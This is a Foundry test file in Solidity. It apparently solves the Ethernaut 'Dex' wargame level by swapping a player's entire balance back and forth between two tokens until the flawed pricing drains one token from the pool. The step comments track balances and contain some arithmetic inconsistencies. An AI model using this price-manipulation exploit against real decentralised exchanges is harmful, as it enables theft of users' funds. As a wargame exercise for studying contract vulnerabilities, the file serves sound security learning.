// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../Dex.sol";

contract DexTest is Test {
    address owner = makeAddr("owner");
    address swapper = makeAddr("swapper");
    Dex dex;
    SwappableToken token1;
    SwappableToken token2;

    function setUp() public {
        vm.startPrank(owner);
        dex = new Dex();
        token1 = new SwappableToken(address(dex), "wrapped ether", "WETH", 100);
        token2 = new SwappableToken(address(dex), "dai", "DAI", 100); 
        dex.setTokens(address(token1), address(token2));
        vm.stopPrank();
    }
    function test_challenge22_Passed() public {
        vm.startPrank(owner);
        token1.approve(address(dex), type(uint128).max);
        token2.approve(address(dex), type(uint128).max);
        dex.addLiquidity(address(token1), 100);
        dex.addLiquidity(address(token2), 100); 
        vm.stopPrank();

        // Give `swapper` 10 units of `token1`
        deal(address(token1), swapper, 10);
        assertEq(token1.balanceOf(swapper), 10);

        // Give `swapper` 10 units of `token2`
        deal(address(token2), swapper, 10);
        assertEq(token2.balanceOf(swapper), 10);

        vm.startPrank(swapper);  // DEX: token1 = 100, token2 = 100 | Player: token1 = 10, token2 = 10
        
        token1.approve(address(dex), type(uint128).max);
        token2.approve(address(dex), type(uint128).max);

        // Step 1: Swap all 10 T1 → T2
        dex.swap(address(token1), address(token2), 10);
        // DEX: token1 = 110, token2 = 90 | Player: token1 = 0, token2 = 20

        // Step 2: Swap all 20 T2 → T1
        dex.swap(address(token2), address(token1), 20);
        // DEX: token1 = 86, token2 = 110 | Player: token1 = 24, token2 = 0

        // Step 3: Swap all 24 T1 → T2
        dex.swap(address(token1), address(token2), 24);
        // DEX: token1 = 110, token2 = 80 | Player: token1 = 0, token2 = 30

        // Step 4: Swap all 30 T2 → T1
        dex.swap(address(token2), address(token1), 30);
        // DEX: token1 = 69, token2 = 110 | Player: token1 = 41, token2 = 0

        // Step 5: Swap all 41 T1 → T2
        dex.swap(address(token1), address(token2), 41);
        // DEX: token1 = 110, token2 = 45 | Player: token1 = 0, token2 = 65
        console.log(token2.balanceOf(swapper));  
        console.log(token1.balanceOf(address(dex)));

        // Step 6: Swap all 45 T2 → T1
        dex.swap(address(token2), address(token1), 45);
        // DEX: token1 = 0, token2 = 90 | Player: token1 = 110, token2 = 20

        vm.stopPrank();
        assertEq(
            token1.balanceOf(address(dex)) == 0 || token2.balanceOf(address(dex)) == 0,
            true,
            "DEX should have 0 of at least one token"
        );
    }
}